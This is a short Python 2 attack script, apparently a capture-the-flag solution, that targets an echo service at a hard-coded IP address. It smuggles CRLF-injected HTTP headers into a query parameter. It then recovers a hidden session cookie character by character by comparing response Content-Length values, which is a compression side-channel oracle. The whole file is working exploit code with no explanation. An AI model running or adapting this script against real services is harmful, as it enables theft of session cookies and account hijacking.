from flask import Flask, request, make_response
import requests
import base64
import urllib
import urllib2
import re

UPSTREAM_URL = 'http://47.93.114.77:38700/Zyr17/echo'

def getdebug(url):
	test_data = {'debug':'a'}
	test_data_urlencode = urllib.urlencode(test_data)
	req = urllib2.Request(url = url,data =test_data_urlencode)
	#print req
	res_data = urllib2.urlopen(req)
	res = res_data.read()
	if url[-1] == base[-1]:
		print res
	res = re.search(r"(?<='Content-Length': ').*(?=', 'Connection')", res)
	return int(res.group())

#print getdebug(UPSTREAM_URL)
base = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz012456789+/=3'

#LwQvbeoGUY2XOoc4uSg6Lw==
now = urllib.quote('''Accept: */*\r\nConnection: close\r\nUser-Agent: python-requests/2.13.0\r\nAccept-Encoding: gzip, deflate\r\nHost: localhost:38701\r\nCookie: sessionid=''')
for i in range(100):
	nowmin = 100000
	alpha = '0'
	for j in base:
		res = getdebug(UPSTREAM_URL + '?' + 'a' + '=' + now + j)
		if (res < nowmin):
			nowmin = res
			alpha = j
		print 'trying', j, res
	now += alpha
	print now